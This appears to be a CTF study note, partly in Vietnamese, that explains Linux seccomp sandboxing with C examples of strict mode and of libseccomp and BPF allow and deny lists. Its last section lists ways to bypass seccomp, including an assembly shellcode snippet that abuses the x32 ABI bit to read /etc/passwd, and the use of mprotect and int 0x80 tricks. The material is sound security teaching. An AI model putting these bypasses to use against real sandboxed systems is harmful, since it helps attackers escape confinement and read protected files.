# Bypass Seccomp

## [0] Overview 
- `SANDBOX` -> `SECCOMP`(SECure COMPuting mode) -> (`STRICT_MODE`, `FILTER_MODE`)
- `1.` `STRICT_MODE` -> This mode allows only `read,  write,  exit, and sigreturn` system calls to be called, so when a call request for other system calls comes in, a `SIGKILL signal` is generated and the program is terminated. This mode allows very few system calls, making it unsuitable for multi-function applications.
```c
// Name: strict_mode.c
// Compile: gcc -o strict_mode strict_mode.c
#include <fcntl.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <unistd.h>
void init_filter() { prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT); }
int main() {
    char buf[256];
    int fd = 0;
    init_filter();
    write(1, "OPEN!\n", 6);
    fd = open("/bin/sh", O_RDONLY);
    write(1, "READ!\n", 6);
    read(fd, buf, sizeof(buf) - 1);
    write(1, buf, sizeof(buf));
    return 0;
}
``` 
- `2.` `FILTER_MODE` -> This mode can use 2 list is (`ALLOW_LIST` or `DENY_LIST`) and has two ways apply this: 
    ```bash
    sudo apt-get install libseccomp-dev libseccomp2 seccomp
    ```
    * `A Library Function` 

    | Command          | Explanation        |
    | ----------------- | -------------- |
    | seccomp_init      | Set value default of mode SECCOMP  |
    | seccomp_rule_add  | Add rule SECCOMP, can is DENY or ALLOW  |
    | seccomp_load      | Load rule into application  |

    * Sample:
        + `ALLOW_LIST`
        ```c
        // Name: libseccomp_alist.c
        // Compile: gcc -o libseccomp_alist libseccomp_alist.c -lseccomp
        #include <fcntl.h>
        #include <seccomp.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <sys/prctl.h>
        #include <unistd.h>
        void sandbox() {
            scmp_filter_ctx ctx;
            ctx = seccomp_init(SCMP_ACT_KILL);
            if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
            }
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
            seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
            seccomp_load(ctx);
        }
        int banned() { fork(); }
        int main(int argc, char *argv[]) {
            char buf[256];
            int fd;
            memset(buf, 0, sizeof(buf));
            sandbox();
            if (argc < 2) {
                banned();
            }
            fd = open("/bin/sh", O_RDONLY);
            read(fd, buf, sizeof(buf) - 1);
            write(1, buf, sizeof(buf));
        }
        ```
        + `DENY_LIST`
        ```c
        // Name: libseccomp_dlist.c
        // Compile: gcc -o libseccomp_dlist libseccomp_dlist.c -lseccomp
        #include <fcntl.h>
        #include <seccomp.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <sys/prctl.h>
        #include <unistd.h>
        void sandbox() {
            scmp_filter_ctx ctx;
            ctx = seccomp_init(SCMP_ACT_ALLOW);
            if (ctx == NULL) {
                exit(0);
            }
            seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
            seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), 0);
            seccomp_load(ctx);
        }
        int main(int argc, char *argv[]) {
            char buf[256];
            int fd;
            memset(buf, 0, sizeof(buf));
            sandbox();
            fd = open("/bin/sh", O_RDONLY);
            read(fd, buf, sizeof(buf) - 1);
            write(1, buf, sizeof(buf));
        }
        ```

    * `Berkeley Packet Filter (BPF) syntax` You can apply SECCOMP using this, BPF is a Virtual Machine (VM) supported by the kernel.
        
        | Command          | Explanation        |
        | ----------------- | -------------- |
        | BPF_LD (Load)      | Copies the value passed as an argument to the accumulator. This allows you to copy a value and then compare that value in a comparison statement.  |
        | BPF_JMP (Jump)  | Branches to the specified location. |
        | BPF_JEQ (Jump if Equal)     | If the set comparison syntax matches, it branches to the specified position. |
        | BPF_RET (Return)      | Returns the value passed as an argument. |
    * `BPF-Macro` This way is used more often [*]
        | Command          | Explanation        |
        | ----------------- | -------------- |
        | BPF_STMT(opcode, operand) |  |
        | BPF_JUMP(opcode, operand, true_offset, false_offset)  |  |
        

    * Sample
        + `ALLOW LIST`
        ```c
        // Name: secbpf_alist.c
        // Compile: gcc -o secbpf_alist secbpf_alist.c
        #include <fcntl.h>
        #include <linux/audit.h>
        #include <linux/filter.h>
        #include <linux/seccomp.h>
        #include <linux/unistd.h>
        #include <stddef.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/mman.h>
        #include <sys/prctl.h>
        #include <unistd.h>
        #define ALLOW_SYSCALL(name)                               \
        BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)
        #define KILL_PROCESS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)
        #define syscall_nr (offsetof(struct seccomp_data, nr))
        #define arch_nr (offsetof(struct seccomp_data, arch))
        /* architecture x86_64 */
        #define ARCH_NR AUDIT_ARCH_X86_64
        int sandbox() {
        struct sock_filter filter[] = {
            /* Validate architecture. */
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),
            BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0),
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            /* Get system call number. */
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr),
            /* List allowed syscalls. */
            ALLOW_SYSCALL(rt_sigreturn),
            ALLOW_SYSCALL(open),
            ALLOW_SYSCALL(openat),
            ALLOW_SYSCALL(read),
            ALLOW_SYSCALL(write),
            ALLOW_SYSCALL(exit_group),
            KILL_PROCESS,
        };
        struct sock_fprog prog = {
            .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
            .filter = filter,
        };
        if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
            perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
            return -1;
        }
        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) == -1) {
            perror("Seccomp filter error\n");
            return -1;
        }
        return 0;
        }
        void banned() { fork(); }
        int main(int argc, char* argv[]) {
            char buf[256];
            int fd;
            memset(buf, 0, sizeof(buf));
            sandbox();
            if (argc < 2) {
                banned();
            }
            fd = open("/bin/sh", O_RDONLY);
            read(fd, buf, sizeof(buf) - 1);
            write(1, buf, sizeof(buf));
            return 0;
        }
        ```
        + `DENY LIST`
        ```c
        // Name: secbpf_dlist.c
        // Compile: gcc -o secbpf_dlist secbpf_dlist.c
        #include <fcntl.h>
        #include <linux/audit.h>
        #include <linux/filter.h>
        #include <linux/seccomp.h>
        #include <linux/unistd.h>
        #include <stddef.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/mman.h>
        #include <sys/prctl.h>
        #include <unistd.h>
        #define DENY_SYSCALL(name)                                \
        BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)
        #define MAINTAIN_PROCESS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)
        #define syscall_nr (offsetof(struct seccomp_data, nr))
        #define arch_nr (offsetof(struct seccomp_data, arch))
        /* architecture x86_64 */
        #define ARCH_NR AUDIT_ARCH_X86_64
        int sandbox() {
        struct sock_filter filter[] = {
            /* Validate architecture. */
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),
            BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0),
            BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
            /* Get system call number. */
            BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr),
            /* List deny syscalls. */
            DENY_SYSCALL(open),
            DENY_SYSCALL(openat),
            MAINTAIN_PROCESS,
        };
        struct sock_fprog prog = {
            .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
            .filter = filter,
        };
        if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
            perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
            return -1;
        }
        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) == -1) {
            perror("Seccomp filter error\n");
            return -1;
        }
        return 0;
        }
        int main(int argc, char* argv[]) {
            char buf[256];
            int fd;
            memset(buf, 0, sizeof(buf));
            sandbox();
            fd = open("/bin/sh", O_RDONLY);
            read(fd, buf, sizeof(buf) - 1);
            write(1, buf, sizeof(buf));
            return 0;
        }
        ```


## [1] EXPLOIT BYPASS SECCOMP

- Tools check follow seccomp -> `seccomp-tools` 

```bash
sudo apt install -y gcc ruby-dev && \
sudo gem install seccomp-tools
```

- `Một số bài CTF có các format sử dụng seccomp từng gặp`
    * open, read, write có thể được thực thi mà không phụ thuộc vào các lệnh gọi hệ thống khác.
    * Sample `dreamhack.io` deny_list: open, read, write and use `openat`, `sendfile` replace. 
    * Application Binary Interface (ABI): `or rax, 0x40000000`
    ```bash
    mov rax, 2
    or rax, 0x40000000
    lea rdi, [rip+path]
    xor rsi, rsi
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    xor rax, rax
    or rax, 0x40000000
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    or rax, 0x40000000
    syscall
    path: .asciz "/etc/passwd"
    ```
    * `mprotect` allocate segment `rwx` and return execute shellcode [KMACTF2022 - Duet](https://github.com/nhtri2003gmail/CTFWriteup/tree/master/2022/KMACTF-2022/Duet) .
    * Use int0x80 thay cho syscall vì x64 có thể thực thi được system call của x86.
        + Đặt rax, rbx, rcx và rdx nhưng nó chỉ lấy 32 bit đầu tiên của các thanh ghi, đó là eax, ebx, ecx và edx.
        + VD: con trỏ tên tệp chỉ được tối đã là vùng nhớ nào đó có giá trị của địa chỉ tối đa 32-bit .

## [2] REFERENCES:

- https://dreamhack.io/?obj=221
